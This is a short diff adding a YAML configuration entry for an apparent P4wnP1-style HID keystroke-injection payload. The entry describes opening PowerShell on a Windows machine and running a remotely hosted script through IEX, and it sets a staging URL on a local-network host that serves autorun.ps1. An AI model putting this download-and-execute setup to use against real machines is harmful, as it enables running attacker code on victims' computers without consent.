@@ -1,0 +1,7 @@
+name: win_stage_exec
+group: hid
+summary: HID opens PowerShell and executes your hosted script via IEX
+script: payloads/hid/win_stage_exec.py
+env:
+  P4WN_STAGE_URL: "http://10.13.37.1/payloads/www/autorun.ps1"
+  P4WN_STAGE_OPTS: ""
